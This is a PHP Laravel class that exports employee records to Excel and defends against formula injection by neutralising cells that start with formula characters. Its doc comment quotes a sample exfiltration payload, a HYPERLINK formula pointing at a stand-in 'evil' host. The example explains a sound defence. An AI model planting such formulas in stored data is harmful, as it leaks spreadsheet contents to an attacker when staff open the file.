<?php

namespace App\Exports;

use App\Models\Employee;
use Maatwebsite\Excel\Concerns\FromCollection;
use Maatwebsite\Excel\Concerns\WithHeadings;
use Maatwebsite\Excel\Concerns\WithMapping;

class EmployeesExport implements FromCollection, WithHeadings, WithMapping
{
    protected $user;

    public function __construct($user)
    {
        $this->user = $user;
    }

    public function collection()
    {
        $query = Employee::with(['department', 'shift']);

        if ($this->user && $this->user->isRestrictedToOwnDepartment()) {
            $query->where('department_id', $this->user->scopedDepartmentId());
        }

        return $query->get();
    }

    public function headings(): array
    {
        return [
            'ID (ห้ามแก้ไข)',
            'รหัสพนักงาน',
            'คำนำหน้า',
            'ชื่อจริง',
            'นามสกุล',
            'แผนก',
            'ระดับ',
            'กะ',
        ];
    }

    public function map($employee): array
    {
        return [
            $employee->id,
            $this->neutralizeFormula($employee->employee_id),
            $this->neutralizeFormula($employee->prefix),
            $this->neutralizeFormula($employee->fname),
            $this->neutralizeFormula($employee->lname),
            $this->neutralizeFormula($employee->department->dept_name ?? '-'),
            $employee->level,
            $this->neutralizeFormula($employee->shift->shift_name ?? '-'),
        ];
    }

    /**
     * PhpSpreadsheet's DefaultValueBinder maps any string starting with "=" to
     * TYPE_FORMULA, so a name stored as =HYPERLINK("http://evil/?d="&A2,"x") becomes a
     * live formula when HR opens the export. Prefixing with an apostrophe forces Excel
     * to treat the cell as literal text; the apostrophe is not shown to the reader.
     */
    private function neutralizeFormula($value)
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)
            ? "'" . $value
            : $value;
    }
}
